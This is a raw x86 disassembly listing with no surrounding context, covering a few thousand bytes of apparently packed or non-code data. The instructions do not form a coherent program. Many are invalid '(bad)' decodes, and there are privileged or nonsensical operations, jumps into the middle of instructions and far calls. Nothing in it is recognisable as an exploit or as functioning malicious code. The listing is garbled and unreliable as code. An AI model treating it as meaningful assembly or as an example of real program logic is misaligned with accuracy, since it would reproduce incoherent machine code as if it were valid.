  419c79:	call   0xff429c40
  419c7e:	mov    edi,eax
  419c80:	push   ecx
  419c81:	pop    es
  419c82:	mov    esi,DWORD PTR [edi]
  419c84:	push   esi
  419c85:	inc    edi
  419c86:	add    al,0x70
  419c88:	add    BYTE PTR [ecx+0x66],ah
  419c8b:	(bad)  
  419c8c:	into   
  419c8d:	fs ds int 0x0
  419c91:	mov    ecx,0x7ce0866
  419c96:	ret    0x66
  419c99:	add    bh,al
  419c9b:	add    al,0xfc
  419c9d:	add    BYTE PTR [ebp+0x31c3f866],al
  419ca3:	ds pushf 
  419ca5:	add    BYTE PTR [esi+0x66],ah
  419ca8:	into   
  419ca9:	ret    
  419caa:	pop    ebp
  419cab:	adc    al,0x57
  419cad:	add    BYTE PTR [edi-0x723c409a],dh
  419cb3:	add    edi,edi
  419cb5:	jne    0x419d0c
  419cb7:	lea    edx,[ecx+0x1]
  419cba:	mov    ebx,0xd64ff1
  419cbf:	sar    DWORD PTR [ebx],1
  419cc1:	test   BYTE PTR [ebp+0x38],dh
  419cc4:	mov    DWORD PTR [esp+edi*8-0x76],esp
  419cc8:	push   edi
  419cc9:	xor    BYTE PTR [ebx],0x37
  419ccc:	mov    esi,ebx
  419cce:	xor    eax,DWORD PTR [eax-0x3c738f9a]
  419cd4:	cmp    BYTE PTR [ebp+0x64],al
  419cd7:	pop    ebx
  419cd8:	mov    ebx,0x9c3b36
  419cdd:	je     0x419d0a
  419cdf:	xor    edi,DWORD PTR [ebx+0x668a33]
  419ce5:	mov    WORD PTR [ebx],?
  419ce7:	cmp    BYTE PTR [ebx+0x8b4e64],bh
  419ced:	pop    edi
  419cee:	cmp    ecx,ecx
  419cf0:	jne    0x419d47
  419cf2:	mov    ebp,esp
  419cf4:	cld    
  419cf5:	push   esi
  419cf6:	pop    ebx
  419cf7:	inc    ebp
  419cf8:	stc    
  419cf9:	test   DWORD PTR ss:[eax+edi*8-0x317af642],ebx
  419d01:	clc    
  419d02:	test   dl,dl
  419d04:	cmp    bh,bh
  419d06:	fs pop si
  419d09:	or     bl,al
  419d0b:	add    al,0x8b
  419d0d:	add    BYTE PTR [ecx+0x66],dl
  419d10:	push   edi
  419d11:	retf   0x3e45
  419d14:	add    BYTE PTR ss:[esi+eiz*2-0x3d7a3542],bl
  419d1c:	clc    
  419d1d:	add    BYTE PTR [ebx+0x66],bl
  419d20:	dec    edx
  419d22:	mov    edx,DWORD PTR [edi-0x76]
  419d25:	push   edi
  419d26:	add    al,0xb7
  419d28:	xor    al,0xba
  419d2a:	cmp    al,0x8d
  419d2c:	je     0x419d2d
  419d2e:	mov    edx,DWORD PTR [ebp-0x46]
  419d31:	push   ecx
  419d32:	lea    edi,[ebx+0x554fff]
  419d38:	push   ecx
  419d39:	cmp    edx,DWORD PTR [ebx+0x75]
  419d3c:	mov    ecx,DWORD PTR [ecx+0x723bfcbb]
  419d42:	add    BYTE PTR [ebx],dh
  419d44:	sub    ecx,DWORD PTR [ebx+0x668a33bb]
  419d4a:	add    BYTE PTR [ebx+esi*1+0x4f64bb38],cl
  419d51:	mov    ebx,0x3b3b00
  419d56:	jne    0x419d83
  419d58:	mov    DWORD PTR [ebx+0x728afc],edi
  419d5e:	xor    esi,DWORD PTR [ebx]
  419d60:	mov    edi,DWORD PTR [ebx+0x8d4e33]
  419d66:	push   edi
  419d67:	cmp    esp,ebp
  419d69:	jne    0x419d6b
  419d6b:	sbb    DWORD PTR [eax],0x8085c3fc
  419d71:	clc    
  419d72:	inc    edi
  419d73:	pop    ebx
  419d74:	sti    
  419d75:	add    eax,0xeb8bc075
  419d7a:	cld    
  419d7b:	xor    edi,DWORD PTR ds:0xf8c3855e
  419d81:	mov    ecx,DWORD PTR [ecx+edx*2]
  419d84:	rol    DWORD PTR [ebp-0x37],0xf
  419d88:	mov    DWORD PTR [eax],ecx
  419d8a:	inc    edi
  419d8b:	(bad)  
  419d8c:	in     eax,0xfc
  419d8e:	add    bh,bh
  419d90:	(bad)  
  419d91:	mov    esi,0xc38a5e
  419d96:	mov    esi,DWORD PTR [ebx]
  419d98:	push   ecx
  419d99:	mov    edi,0xfc4ec7
  419d9e:	test   DWORD PTR [ebp-0x8],edx
  419da1:	xor    di,ax
  419da4:	pushf  
  419da5:	sub    ebp,eax
  419da7:	inc    ebp
  419da8:	(bad)  
  419da9:	sub    edi,edi
  419dab:	mov    DWORD PTR [ebx+0x3b03ba08],ecx
  419db1:	inc    ebp
  419db2:	add    BYTE PTR [esi+0x2b],ah
  419db5:	or     bh,BYTE PTR [edx+0xf8ac2]
  419dbb:	cmp    al,0x33
  419dbd:	mov    edi,DWORD PTR [edx+0xfc4e81]
  419dc3:	(bad)  
  419dc4:	cmp    esi,DWORD PTR [ebx]
  419dc6:	je     0x419d80
  419dc8:	push   ebx
  419dc9:	dec    esi
  419dca:	str    ecx
  419dcd:	cmp    esp,DWORD PTR [ebp+esi*2-0x33]
  419dd1:	xor    edi,DWORD PTR [edi+0x789085f]
  419dd7:	mov    edx,DWORD PTR [esp+edi*8]
  419dda:	add    cl,cl
  419ddc:	data16 add al,0xcb
  419ddf:	push   ebp
  419de0:	add    ebp,esp
  419de2:	jne    0x419dd0
  419de4:	(bad)  
  419de5:	mov    DWORD PTR [ecx],0xd685f7ec
  419deb:	clc    
  419dec:	xlat   BYTE PTR ds:[ebx]
  419ded:	inc    ebp
  419dee:	mov    esi,DWORD PTR [eax]
  419df0:	push   eax
  419df1:	pushf  
  419df2:	in     eax,0x8b
  419df4:	add    ah,ch
  419df6:	add    al,0x55
  419df8:	add    BYTE PTR [ecx+0x66],dl
  419dfb:	add    eax,0x3e72cb
  419e00:	add    BYTE PTR [ebp+0x66],al
  419e03:	(bad)  
  419e04:	retf   
  419e05:	lock ret 0x85
  419e09:	clc    
  419e0a:	inc    bp
  419e0c:	retf   
  419e0d:	cmp    eax,0xc77d9cc8
  419e12:	ss cld 
  419e14:	pushf  
  419e15:	test   DWORD PTR [edi-0x8],ebx
  419e18:	je     0x419e5f
  419e1a:	xor    esi,DWORD PTR ds:0x7020840
  419e20:	ror    BYTE PTR [ebp-0x37],0x8d
  419e24:	push   ebp
  419e25:	add    esp,ebp
  419e27:	jb     0x419db4
  419e29:	add    BYTE PTR [eax],cl
  419e2b:	dec    ebp
  419e2c:	mov    bh,0x81
  419e2e:	push   esi
  419e2f:	push   ebp
  419e30:	adc    DWORD PTR [ecx-0x3c],0x3e9cff81
  419e37:	xor    al,BYTE PTR [eax]
  419e39:	mov    edx,DWORD PTR [edi+0x10]
  419e3c:	(bad)  
  419e3d:	scas   eax,DWORD PTR es:[edi]
  419e3e:	ret    0x3b
  419e41:	jns    0x3b429b34
  419e47:	mov    esi,DWORD PTR [eax+edx*1-0x75]
  419e4b:	dec    ebp
  419e4c:	or     BYTE PTR [ebx],ch
  419e4e:	ret    0x458b
  419e51:	lock jmp 0x419e45
  419e54:	mov    ecx,DWORD PTR [eax]
  419e56:	or     BYTE PTR [edi],al
  419e58:	mov    ecx,eax
  419e5a:	xor    DWORD PTR [edx+0x2],0x0
  419e5e:	mov    bh,0xc1
  419e60:	adc    BYTE PTR [eax],dh
  419e62:	iret   
  419e63:	inc    ebp
  419e64:	mov    DWORD PTR [ebx],0x4dfff8c4
  419e6a:	inc    BYTE PTR [ebx]
  419e6c:	ret    0xf8
  419e6f:	adc    DWORD PTR [esi+0x10],esp
  419e72:	clc    
  419e73:	dec    ecx
  419e74:	fisttp WORD PTR [ecx+0x456604c0]
  419e7a:	add    dh,BYTE PTR ds:0x75e0845
  419e80:	ret    0x4d
  419e83:	lea    ecx,[ebx+0x18728301]
  419e89:	add    BYTE PTR [ebp+0x45],al
  419e8c:	xor    ecx,ebp
  419e8e:	pushf  
  419e8f:	add    bh,al
  419e91:	add    al,ch
  419e93:	inc    ebp
  419e94:	test   DWORD PTR [ebx-0x3eba0708],ecx
  419e9a:	xor    eax,0x781084d
  419e9f:	push   ebp
  419ea0:	pushf  
  419ea1:	push   ecx
  419ea2:	xor    al,BYTE PTR [ecx+0x32f89c89]
  419ea8:	inc    ebp
  419ea9:	cmp    edi,DWORD PTR [ecx]
  419eab:	jbe    0x419e49
  419ead:	mov    eax,edi
  419eaf:	or     ah,dh
  419eb1:	inc    ebp
  419eb2:	test   DWORD PTR [ebx+0x4d450cf8],ecx
  419eb8:	xor    ecx,DWORD PTR [ebx-0x74747664]
  419ebe:	in     al,dx
  419ebf:	hlt    
  419ec0:	push   ebp
  419ec1:	push   ebp
  419ec2:	push   ecx
  419ec3:	push   ecx
  419ec4:	mov    ecx,DWORD PTR [ebx-0x7b7b0708]
  419eca:	pushf  
  419ecb:	pushf  
  419ecc:	xor    dh,BYTE PTR [edx]
  419ece:	mov    ecx,DWORD PTR [ecx+0x5bf1f8e8]
  419ed4:	or     BYTE PTR [ebp+0x7],al
  419ed7:	mov    eax,ecx
  419ed9:	clc    
  419eda:	jb     0x419e9d
  419edc:	add    BYTE PTR [ebp+0x55],cl
  419edf:	or     DWORD PTR [edi],0xc251d155
  419ee5:	add    DWORD PTR [ebx+0x32009c],0x8b76453b
  419eef:	mov    edi,eax
  419ef1:	or     cl,al
  419ef3:	inc    ebp
  419ef4:	dec    ebp
  419ef5:	mov    eax,DWORD PTR [ecx+0x514d550c]
  419efb:	or     WORD PTR [ecx],0x899c
  419f00:	xor    cl,BYTE PTR [ebx+0x5576fc3b]
  419f06:	mov    edx,DWORD PTR [ecx+0x8]
  419f09:	mov    eax,DWORD PTR [ebp-0x8]
  419f0c:	mov    eax,DWORD PTR [esp+ecx*1-0x74cdb264]
  419f13:	mov    DWORD PTR [ecx+0x4178bf8],ecx
  419f19:	inc    ebp
  419f1a:	dec    eax
  419f1b:	add    ecx,DWORD PTR [ebx+0x554df0f8]
  419f21:	add    edx,DWORD PTR [ecx-0x8]
  419f24:	mov    ecx,DWORD PTR [ecx]
  419f26:	clc    
  419f27:	or     BYTE PTR [ebp+eax*2+0x4532409c],al
  419f2e:	mov    ecx,ebp
  419f30:	clc    
  419f31:	(bad)  
  419f32:	popf   
  419f33:	inc    DWORD PTR [eax]
  419f35:	ret    0x8b
  419f38:	adc    BYTE PTR [ebx-0x38d4aeb3],cl
  419f3e:	mov    edi,esp
  419f40:	hlt    
  419f41:	test   ecx,esi
  419f43:	clc    
  419f44:	or     BYTE PTR [ebp+0x7],al
  419f47:	xor    cl,al
  419f49:	pushf  
  419f4a:	jb     0x419f7f
  419f4c:	add    BYTE PTR [eax-0x3f],al
  419f4f:	inc    eax
  419f50:	daa    
  419f51:	inc    ebp
  419f52:	inc    ebp
  419f53:	xor    eax,0x7f80803
  419f58:	dec    ebp
  419f59:	pushf  
  419f5a:	add    esi,DWORD PTR [edx]
  419f5c:	clc    
  419f5d:	cmp    DWORD PTR [ecx],ecx
  419f5f:	or     al,0x8
  419f61:	add    al,BYTE PTR [ebp+0x2c]
  419f64:	xor    eax,0x7350845
  419f69:	or     BYTE PTR [ebp+0x7],cl
  419f6c:	lea    ebx,[ecx+eax*1+0x8b7232]
  419f73:	or     al,0x45
  419f75:	enter  0x4deb,0x8b
  419f79:	mov    edx,DWORD PTR [eax]
  419f7b:	cld    
  419f7c:	dec    ebp
  419f7d:	push   ebp
  419f7e:	sub    edx,DWORD PTR [ecx-0x75]
  419f81:	add    eax,0xf172fc
  419f86:	or     BYTE PTR [ebp+0x7],cl
  419f89:	add    eax,ecx
  419f8b:	or     al,0x72
  419f8d:	add    DWORD PTR [eax],eax
  419f8f:	mov    ebx,0x29c2c1
  419f94:	inc    ebp
  419f95:	mov    eax,DWORD PTR [ebx]
  419f97:	cmp    eax,0x3004d1c
  419f9d:	xbegin 0x66c72b97
  419fa3:	clc    
  419fa4:	or     BYTE PTR [ebp+0x45],al
  419fa7:	xor    BYTE PTR ds:0x78b089c,dh
  419fad:	adc    BYTE PTR [ebp+0x45],cl
  419fb0:	lea    eax,[ebp+0x33727501]
  419fb6:	add    cl,ch
  419fb8:	inc    ebp
  419fb9:	add    bl,ch
  419fbb:	add    BYTE PTR [ebx+0x45850845],cl
  419fc1:	je     0x419f4e
  419fc3:	push   ebx
  419fc4:	or     al,0x85
  419fc6:	dec    ebp
  419fc7:	std    
  419fc8:	mov    bh,bh
  419fca:	mov    BYTE PTR [ebp-0x75],al
  419fcd:	mov    edi,eax
  419fcf:	or     al,0x89
  419fd1:	inc    ebp
  419fd2:	clc    
  419fd3:	mov    esp,esp
  419fd5:	hlt    
  419fd6:	call   DWORD PTR [edi-0x37]
  419fd9:	push   ebp
  419fda:	or     al,0x51
  419fdc:	push   ebp
  419fdd:	xor    ebp,esp
  419fdf:	mov    esi,0x457251
  419fe4:	xor    esi,eax
  419fe6:	pushf  
  419fe7:	inc    ebp
  419fe8:	(bad)  
  419fe9:	mov    edi,eax
  419feb:	or     al,0x85
  419fed:	add    al,bh
  419fef:	inc    eax
  419ff1:	mov    esi,DWORD PTR [ebx+ecx*4-0x75]
  419ff5:	or     ah,bh
  419ff7:	inc    eax
  419ff8:	push   ebp
  419ff9:	jmp    0x41a04c
  419ffb:	mov    eax,DWORD PTR ds:0xe8720c
  41a001:	mov    DWORD PTR [ebp-0x8],eax
  41a004:	jne    0x41a04b
  41a006:	jmp    0x419f93
  41a008:	mov    ebp,DWORD PTR [eax]
  41a00a:	clc    
  41a00b:	retf   0xff55
  41a00e:	push   ecx
  41a00f:	mov    DWORD PTR ds:0x757210,eax
  41a015:	mov    ecx,DWORD PTR [ebp-0x4]
  41a018:	sub    esp,DWORD PTR [ebx-0x77]
  41a01b:	dec    DWORD PTR [eax*4-0x74ca8abb]
  41a022:	or     ah,bh
  41a024:	pop    es
  41a025:	ds pushf 
  41a027:	push   DWORD PTR [edx]
  41a029:	mov    ecx,DWORD PTR [ebx+0x4dc708f0]
  41a02f:	(bad)  
  41a030:	mov    bh,bh
  41a032:	jmp    0x41a020
  41a034:	leave  
  41a035:	jne    0x41a03f
  41a037:	call   0x2e9991
  41a03c:	in     al,dx
  41a03d:	dec    ebp
  41a03e:	add    dh,BYTE PTR [ebx]
  41a040:	add    BYTE PTR [ebx],al
  41a042:	inc    ebp
  41a043:	cmp    esi,DWORD PTR [ecx]
  41a045:	je     0x419fe3
  41a047:	mov    eax,edi
  41a049:	or     al,0xf0
  41a04b:	add    BYTE PTR [ebp+0x458bf845],al
  41a051:	or     BYTE PTR [ebx-0x3f7cf7b3],cl
  41a057:	adc    al,0x7
  41a059:	enter  0x9fc0,0xa5
  41a05d:	rol    BYTE PTR [eax],0x5e
  41a060:	mov    ecx,ecx
  41a062:	or     al,0xc
  41a064:	ror    BYTE PTR [ebx+0x408df8f2],0xe4
  41a06b:	jmp    0x41a06c
  41a06d:	push   ebp
  41a06e:	mov    esp,ebp
  41a070:	cld    
  41a071:	inc    ebp
  41a072:	inc    ebp
  41a073:	or     DWORD PTR [ecx+0x457dec10],0x0
  41a07a:	push   esi
  41a07b:	push   esi
  41a07c:	mov    edi,0x7af080f
  41a081:	add    bh,al
  41a083:	test   DWORD PTR [edi+ecx*1+0x3a732],ebx
  41a08a:	mov    DWORD PTR [edi],ecx
  41a08c:	adc    BYTE PTR [eax+0x45],al
  41a08f:	mov    ebp,eax
  41a091:	mov    ebp,edi
  41a093:	lock call edx
  41a096:	fcom   DWORD PTR [ebp+0x45]
  41a099:	mov    eax,0x148a8b
  41a09e:	push   ecx
  41a09f:	enter  0xc145,0x83
  41a0a3:	cmp    ecx,DWORD PTR [eax]
  41a0a5:	add    BYTE PTR [ebp+0x4d],al
  41a0a8:	mov    eax,DWORD PTR [ebx+0x3340fcf8]
  41a0ae:	call   0xffa19c1d
  41a0b3:	cmp    eax,DWORD PTR [ebp-0xc]
  41a0b6:	jmp    DWORD PTR [eax+edx*1-0x4e]
  41a0ba:	push   ebp
  41a0bb:	(bad)  
  41a0bc:	call   0x329ec0
  41a0c1:	mov    bh,0xdb
  41a0c3:	cld    
  41a0c4:	or     BYTE PTR [ebp+0x45],bl
  41a0c7:	(bad)  
  41a0c8:	call   0xff7b9d58
  41a0cd:	add    al,BYTE PTR [ebp+0x37]
  41a0d0:	xor    esi,DWORD PTR [edi+0x4e50bf03]
  41a0d6:	jne    0x41a0d8
  41a0d8:	(bad)  
  41a0d9:	cmp    edi,esp
  41a0db:	jne    0x41a10e
  41a0dd:	mov    edi,edi
  41a0df:	or     BYTE PTR [ebx-0x307f0b49],cl
  41a0e5:	pop    ds
  41a0e6:	into   
  41a0e7:	je     0x41a0aa
  41a0e9:	mov    ebx,DWORD PTR [esi]
  41a0eb:	or     BYTE PTR [ebp-0x49],al
  41a0ee:	mov    esp,DWORD PTR [esi-0x77]
  41a0f1:	mov    esi,0x4451f0c
  41a0f6:	mov    eax,DWORD PTR [eax]
  41a0f8:	or     al,0x66
  41a0fa:	sar    bl,0x3b
  41a0fd:	xor    esi,DWORD PTR [ebp+0x66]
  41a100:	xor    ecx,edi
  41a102:	pop    edi
  41a103:	adc    bl,BYTE PTR [ebx+0x70]
  41a106:	ret    0xff
  41a109:	cld    
  41a10a:	inc    ebp
  41a10b:	mov    ecx,DWORD PTR [ebx-0xec6e70c]
  41a111:	cld    
  41a112:	mov    ebp,DWORD PTR [ebx+ecx*4-0x13baf3fa]
  41a119:	push   0xffffff83
  41a11b:	pop    edi
  41a11c:	or     BYTE PTR [ebp+0x53],dh
  41a11f:	xorps  xmm1,xmm2
  41a122:	test   BYTE PTR [eax+eax*1],bh
  41a125:	add    BYTE PTR [eax],al
  41a127:	adc    eax,eax
  41a129:	add    DWORD PTR [eax+esi*2-0xff7b00],0xffffffb7
  41a131:	jmp    DWORD PTR [eax]
  41a133:	ror    al,0x5e
  41a136:	inc    ebp
  41a137:	leave  
  41a138:	xor    ecx,DWORD PTR [eax]
  41a13a:	and    DWORD PTR [ebx-0x3ec10708],ecx
  41a140:	add    ah,al
  41a142:	xor    edi,edi
  41a144:	xor    DWORD PTR [ebx],0x66003304
  41a14a:	mov    DWORD PTR [ebp-0xc],ecx
  41a14d:	pcmpgtw mm0,mm0
  41a150:	add    dl,ah
  41a152:	leave  
  41a153:	mov    edi,DWORD PTR [esi-0x7d]
  41a156:	push   ax
  41a158:	dec    ebp
  41a159:	mov    esi,DWORD PTR [ebx-0x75]
  41a15c:	lea    ebp,[eax-0x7c00ff04]
  41a162:	xor    eax,DWORD PTR [eax]
  41a164:	sysret 
  41a166:	dec    ebp
  41a167:	ror    BYTE PTR [ebx+0xc000c30],0x6a
  41a16e:	push   WORD PTR [ecx+0x8]
  41a172:	jne    0x41a135
  41a174:	ud0    ecx,DWORD PTR [ecx]
  41a177:	mov    eax,edx
  41a179:	lods   al,BYTE PTR ds:[esi]
  41a17a:	add    BYTE PTR [eax],al
  41a17c:	data16 (bad) 
  41a17e:	iret   
  41a17f:	and    cl,BYTE PTR [eax*2+0x440f8d5d]
  41a186:	cli    
  41a187:	inc    ebp
  41a188:	cmp    al,0x8d
  41a18a:	add    BYTE PTR [esi+0x2d],ah
  41a18d:	inc    ebp
  41a18e:	pop    ebp
  41a18f:	lea    ecx,[edi]
  41a191:	mov    dl,bh
  41a193:	add    BYTE PTR [edi],cl
  41a195:	mov    DWORD PTR [eax+eax*8],edi
  41a198:	mov    ebx,0x3b87
  41a19d:	add    BYTE PTR [ebx],ch
  41a19f:	inc    ebp
  41a1a0:	data16 (bad) 
  41a1a2:	clc    
  41a1a3:	int3   
  41a1a4:	cmp    eax,DWORD PTR [eax]
  41a1a6:	je     0x41a131
  41a1a8:	push   0xffffffc8
  41a1aa:	pop    edi
  41a1ab:	xchg   DWORD PTR [ebp+0x0],eax
  41a1ae:	data16 add BYTE PTR [ebp+0x45],cl
  41a1b2:	lea    cx,[ebp+0x10]
  41a1b6:	jb     0x41a1b8
  41a1b8:	jmp    0x41a143
  41a1ba:	call   eax
  41a1bc:	clc    
  41a1bd:	xchg   DWORD PTR [edi+0x1],edi
  41a1c0:	mov    eax,DWORD PTR [eax]
  41a1c2:	or     BYTE PTR [ebp-0x49],al
  41a1c5:	lea    eax,[eax+0x74003154]
  41a1cb:	push   edi
  41a1cc:	inc    edx
  41a1cd:	jge    0x41a1ce
  41a1cf:	mov    DWORD PTR [edi],ecx
  41a1d1:	fdiv   DWORD PTR [edi-0x6]
  41a1d4:	inc    DWORD PTR [eax]
  41a1d6:	xor    edx,DWORD PTR [eax+0x5f]
  41a1d9:	xchg   DWORD PTR [ebx+0x1],ebx
  41a1dc:	ret    0x0
  41a1df:	xor    BYTE PTR [ebp-0x51],cl
  41a1e2:	cmp    edi,0xf0ff89fc
  41a1e8:	data16 ror al,0x84
  41a1ec:	rol    BYTE PTR [eax],0x3b
  41a1ef:	add    al,dh
  41a1f1:	dec    eax
  41a1f2:	xchg   esp,eax
  41a1f3:	push   ebx
  41a1f4:	jmp    0x41a181
  41a1f6:	push   ebp
  41a1f7:	add    esp,ebp
  41a1f9:	add    ebp,esp
  41a1fb:	mov    edx,DWORD PTR [edi+0x24]
  41a1fe:	clc    
  41a1ff:	dec    esi
  41a200:	xchg   DWORD PTR [ebx+0x5e002001],ecx
  41a206:	cmp    BYTE PTR [ebx],al
  41a208:	jne    0x41a193
  41a20a:	xor    esp,eax
  41a20c:	jmp    0x44a38f
  41a211:	add    ebp,DWORD PTR [ecx+ecx*4]
  41a214:	jne    0x41a20a
  41a216:	call   0xffcb9f70
  41a21b:	clc    
  41a21c:	xchg   edi,eax
  41a21d:	sti    
  41a21e:	add    DWORD PTR [ebx],eax
  41a220:	add    BYTE PTR [ebp+0x47],bl
  41a223:	xor    ecx,DWORD PTR [ecx+0x47e8b489]
  41a229:	pop    ebp
  41a22a:	mov    DWORD PTR [esi-0x48],esi
  41a22d:	jmp    0x41a276
  41a22f:	mov    ecx,DWORD PTR [ecx-0x7882431c]
  41a235:	(bad)  
  41a237:	cmp    al,0x0
  41a239:	cmp    eax,DWORD PTR [ebp+0x18]
  41a23c:	lea    ebx,[ebp-0x56]
  41a23f:	jle    0x41a241
  41a241:	jae    0x41a1cc
  41a243:	mov    eax,esp
  41a245:	call   0xb900:0x8b005587
  41a24c:	inc    ebp
  41a24d:	push   ebp
  41a24e:	lea    ecx,[ebp-0x27ff4f12]
  41a254:	mov    eax,edi
  41a256:	int3   
  41a257:	push   ebp
  41a258:	xchg   edi,eax
  41a25a:	add    esp,ebp
  41a25c:	add    BYTE PTR [eax],al
  41a25e:	inc    ebp
  41a25f:	add    BYTE PTR [ebp+0x8b3255],cl
  41a265:	cld    
  41a266:	mov    DWORD PTR [edx],edi
  41a268:	aam    0x75
  41a26a:	xchg   DWORD PTR [ebx+0x3400dc01],ecx
  41a270:	mov    DWORD PTR [ebx-0x50],edx
  41a273:	test   BYTE PTR [ebp-0x1],0xe8
  41a277:	mov    eax,DWORD PTR [eax]
  41a279:	hlt    
  41a27a:	add    al,al
  41a27c:	mov    eax,DWORD PTR ds:0x890045a8
  41a282:	dec    DWORD PTR [ebx+0x45fdf0e8]
  41a288:	inc    DWORD PTR [eax*2+0xf75854d]
  41a28f:	mov    ebp,DWORD PTR [ebp-0x7476ff18]
  41a295:	call   0x7297ffd6
  41a29a:	je     0x41a2fa
  41a29c:	js     0x41a2fd
  41a29e:	lock ret 0x7e
  41a2a2:	mov    ecx,DWORD PTR [ebx+0x8568b1c]
  41a2a8:	mov    edi,edi
  41a2aa:	sbb    al,bl
  41a2ac:	clc    
  41a2ad:	add    BYTE PTR [ebp-0x73],bh
  41a2b0:	mov    ebx,DWORD PTR [eax-0x7437ffec]
  41a2b6:	ror    BYTE PTR [eax],1
  41a2b8:	dec    ebp
  41a2b9:	xchg   ebp,eax
  41a2ba:	mov    edi,edi
  41a2bc:	in     al,0x8b
  41a2be:	jge    0x41a249
  41a2c0:	cmp    ecx,DWORD PTR [ebx+0x39893377]
  41a2c6:	clc    
  41a2c7:	pop    esi
  41a2c8:	fist   DWORD PTR [ebp+0x5d398b5d]
  41a2ce:	clc    
  41a2cf:	add    al,0x6e
  41a2d1:	mov    eax,DWORD PTR [ebx]
  41a2d3:	mov    BYTE PTR [ebp+0x0],dl
  41a2d6:	mov    edx,DWORD PTR [ebx-0x20]
  41a2d9:	adc    esi,DWORD PTR [edi+0x5e005f3e]
  41a2df:	add    eax,0x3b3b73
  41a2e4:	adc    al,0x89
  41a2e6:	pop    eax
  41a2e7:	sbb    DWORD PTR [edx+eax*1],0xffffff8b
  41a2eb:	ret    0xf08
  41a2ee:	cmp    al,0x2
  41a2f0:	mov    edx,eax
  41a2f2:	cld    
  41a2f3:	add    BYTE PTR [ebp+0x66],dl
  41a2f6:	add    eax,ebx
  41a2f8:	add    esp,eax
  41a2fa:	sub    eax,eax
  41a2fc:	or     BYTE PTR [ecx-0x77f474bb],cl
  41a302:	add    BYTE PTR [eax],al
  41a304:	mov    DWORD PTR [ebx-0x24],ebx
  41a307:	push   edi
  41a308:	push   ebp
  41a309:	clc    
  41a30a:	add    DWORD PTR [esi+0x1b0100],0x45
  41a311:	out    0xff,eax
  41a313:	add    edx,DWORD PTR [eax]
  41a315:	jmp    0x41a2ff
  41a317:	cmp    ch,0x47
  41a31a:	(bad)  
  41a31b:	jmp    0x40c72b6d
  41a320:	je     0x41a2ac
  41a322:	mov    eax,DWORD PTR [eax-0x10c78f04]
  41a328:	inc    ebp
  41a329:	add    BYTE PTR [ebx-0x770375],al
  41a32f:	add    ah,ch
  41a331:	add    edx,esp
  41a333:	pop    edi
  41a334:	pop    ebp
  41a335:	push   ebp
  41a336:	inc    ebx
  41a337:	in     al,dx
  41a338:	pop    ebp
  41a339:	in     al,dx
  41a33a:	cmp    edx,DWORD PTR [edi-0x8]
  41a33d:	xor    DWORD PTR [esp+ebx*4-0x173676a5],edx
  41a344:	add    al,0x47
  41a346:	push   ebp
  41a347:	mov    esp,ebp
  41a349:	in     al,0x45
  41a34b:	dec    ebp
  41a34c:	push   esi
  41a34d:	test   DWORD PTR [eax+0xfb010f],esi
  41a353:	add    BYTE PTR [eax+0xc018b],dh
  41a359:	leave  
  41a35a:	inc    ebp
  41a35b:	test   al,ch
  41a35d:	add    dh,bh
  41a35f:	add    bh,bh
  41a361:	dec    ebp
  41a362:	push   cs
  41a363:	mov    DWORD PTR [ecx],eax
  41a365:	hlt    
  41a366:	push   es
  41a367:	dec    ebp
  41a368:	leave  
  41a369:	mov    DWORD PTR [eax],ecx
  41a36b:	clc    
  41a36c:	cmovge eax,ecx
  41a36f:	mov    ecx,0x85c2f0
  41a375:	clc    
  41a376:	pop    DWORD PTR [ebp+0x1]
  41a379:	push   ebx
  41a37a:	add    BYTE PTR [ebp-0x15],bh
  41a37d:	push   esi
  41a37e:	xor    eax,0x898a45
  41a383:	cld    
  41a384:	add    al,0x45
  41a386:	add    BYTE PTR [ebx],dh
  41a388:	pushfw 
  41a38a:	add    DWORD PTR [esi+0x78308c1],edi
  41a390:	add    ah,BYTE PTR [edi+esi*4-0x33]
  41a394:	mov    ebx,0xc4e8b
  41a399:	(bad)  
  41a39a:	cmp    ecx,ebx
  41a39c:	jne    0x41a366
  41a39e:	xor    ecx,DWORD PTR [ebp+0x66]
  41a3a1:	jmp    0xc8a3a7
  41a3a6:	add    DWORD PTR [ebp+0x0],eax
  41a3a9:	mov    eax,ebx
  41a3ab:	or     al,0x8b
  41a3ad:	(bad)  
  41a3ae:	mov    ecx,esi
  41a3b0:	mov    BYTE PTR [eax+eax*1+0x664c138],cl
  41a3b7:	mov    eax,edi
  41a3b9:	or     BYTE PTR [edx],cl
  41a3bb:	shl    cl,cl
  41a3bd:	icebp  
  41a3be:	add    BYTE PTR [ebp+0x37],0x8b
  41a3c2:	or     BYTE PTR [edx+eax*2],cl
  41a3c5:	(bad)  
  41a3c6:	or     cl,dh
  41a3c8:	stc    
  41a3c9:	shl    DWORD PTR [ebp-0x30],0xc6
  41a3cd:	xor    al,0x0
  41a3cf:	inc    ebp
  41a3d0:	xchg   BYTE PTR [ebx],al
  41a3d2:	add    esp,edi
  41a3d4:	add    BYTE PTR [ebp-0x39],cl
  41a3d7:	mov    al,bl
  41a3d9:	test   DWORD PTR [ebx+0x1c348375],ecx
  41a3df:	sub    al,0xbf
  41a3e1:	jmp    0x41a368
  41a3e3:	mov    edi,eax
  41a3e5:	lock jge 0x41a3d9
  41a3e8:	lea    esi,[edx-0x74bad501]
  41a3ee:	mov    ebp,esp
  41a3f0:	or     cl,dh
  41a3f2:	leave  
  41a3f3:	add    al,BYTE PTR [eax+eax*4-0x37ff9c00]
  41a3fa:	dec    ebp
  41a3fb:	dec    ebp
  41a3fc:	test   DWORD PTR [ebx],eax
  41a3fe:	paddb  mm6,mm0
  41a401:	add    DWORD PTR [eax],eax
  41a403:	dec    ebp
  41a404:	mov    ecx,DWORD PTR [ebx-0x63b217f0]
  41a40a:	mov    esi,DWORD PTR [edx]
  41a40c:	or     al,0x2b
  41a40e:	dec    ebp
  41a40f:	xor    ecx,DWORD PTR [ebx+0x4575083b]
  41a415:	mov    esp,esi
  41a417:	adc    BYTE PTR [ebp+edx*2+0x33ec3389],bl
  41a41e:	mov    DWORD PTR [ebx],ebp
  41a420:	call   0xc752d50
  41a425:	mov    DWORD PTR [ebp+0x10],ecx
  41a428:	(bad)  
  41a429:	push   0x8b85ff10
  41a42e:	clc    
  41a42f:	or     al,0x55
  41a431:	(bad)  
  41a432:	push   ecx
  41a433:	retf   
  41a434:	mov    ebx,0xff4d8dc8
  41a439:	mov    DWORD PTR [ebp+0x8],eax
  41a43c:	xor    eax,DWORD PTR [ebp-0x75]
  41a43f:	cmp    ebp,DWORD PTR [ebx]
  41a441:	lsl    ebx,WORD PTR [edi-0x8]
  41a445:	call   DWORD PTR [ebx-0x741bff75]
  41a44b:	(bad)  
  41a44c:	or     al,0x5b
